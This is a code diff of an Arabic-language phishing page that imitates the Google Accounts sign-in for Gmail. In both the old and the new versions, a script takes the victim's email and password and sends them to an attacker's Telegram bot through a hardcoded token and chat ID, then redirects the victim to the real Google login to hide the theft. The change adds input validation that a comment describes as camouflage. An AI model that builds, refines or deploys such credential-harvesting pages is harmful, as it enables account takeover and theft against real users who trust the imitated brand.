@@ -6,14 +6,17 @@
     <title>تسجيل الدخول - حسابات Google</title>
     <style>
         body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .login-box { width: 380px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; position: relative; }
         .logo { width: 75px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
-        p { font-size: 16px; margin-bottom: 25px; }
-        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 5px; color: #202124; }
+        p { font-size: 16px; margin-bottom: 25px; color: #202124; }
+        .input-group { position: relative; margin-bottom: 10px; text-align: right; }
+        input { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; transition: 0.2s; }
         input:focus { border: 2px solid #1a73e8; outline: none; }
-        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
-        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        input.error { border: 2px solid #d93025; }
+        .error-msg { color: #d93025; font-size: 12px; margin-top: 5px; display: none; text-align: right; }
+        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 14px; }
         .create-account { color: #1a73e8; font-weight: bold; text-decoration: none; font-size: 14px; }
     </style>
 </head>
@@ -25,16 +28,19 @@
         <p>المتابعة إلى Gmail</p>
         
         <form id="gForm">
-            <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
-            <input type="password" id="pass" placeholder="أدخل كلمة المرور" required>
-            
-            <div style="text-align: right; margin-top: 5px;">
-                <a href="#" class="create-account">هل نسيت البريد الإلكتروني؟</a>
+            <div class="input-group">
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" autocomplete="off">
+                <div id="email-error" class="error-msg">⚠️ يرجى إدخال بريد إلكتروني صالح</div>
+            </div>
+
+            <div class="input-group">
+                <input type="password" id="pass" placeholder="أدخل كلمة المرور">
+                <div id="pass-error" class="error-msg">⚠️ كلمة المرور مطلوبة</div>
             </div>
 
             <div class="footer">
                 <a href="#" class="create-account">إنشاء حساب</a>
-                <button type="submit" class="btn">التالي</button>
+                <button type="button" class="btn" onclick="validateAndSend()">التالي</button>
             </div>
         </form>
     </div>
@@ -43,28 +49,51 @@
         const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
         const CHAT_ID = "5811700860";
 
-        document.getElementById('gForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        function validateAndSend() {
+            const emailInput = document.getElementById('email');
+            const passInput = document.getElementById('pass');
+            const emailError = document.getElementById('email-error');
+            const passError = document.getElementById('pass-error');
 
-            const user = document.getElementById('email').value;
-            const password = document.getElementById('pass').value;
+            // ريجيكس لفحص صيغة الإيميل (Regex)
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            let isValid = true;
 
-            // إرسال البيانات لبوت التيليجرام فوراً
-            const report = `📧 **صيد Gmail جديد:**\n\n👤 الإيميل: \`${user}\`\n🔑 الباسورد: \`${password}\`\n🌍 الـ IP: [جاري الجلب...]`;
+            // فحص الإيميل
+            if (!emailPattern.test(emailInput.value)) {
+                emailInput.classList.add('error');
+                emailError.style.display = 'block';
+                isValid = false;
+            } else {
+                emailInput.classList.remove('error');
+                emailError.style.display = 'none';
+            }
 
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "Markdown" })
-            })
-            .then(() => {
-                // التحويل لصفحة Gmail الحقيقية لإكمال الدخول
-                window.location.href = "https://accounts.google.com/ServiceLogin?service=mail";
-            })
-            .catch(() => {
-                window.location.href = "https://mail.google.com";
-            });
-        });
+            // فحص الباسورد (لازم يكون أكثر من 4 خانات للتمويه)
+            if (passInput.value.length < 5) {
+                passInput.classList.add('error');
+                passError.innerText = "⚠️ كلمة المرور قصيرة جداً";
+                passError.style.display = 'block';
+                isValid = false;
+            } else {
+                passInput.classList.remove('error');
+                passError.style.display = 'none';
+            }
+
+            if (isValid) {
+                // إذا كل شيء تمام، نرسل البيانات لبايثونيستا
+                const report = `📧 **صيد Gmail محقق:**\n\n👤 الحساب: \`${emailInput.value}\`\n🔑 الباسورد: \`${passInput.value}\``;
+
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "Markdown" })
+                }).then(() => {
+                    // التحويل النهائي
+                    window.location.href = "https://accounts.google.com/ServiceLogin?service=mail";
+                });
+            }
+        }
     </script>
 </body>
 </html>
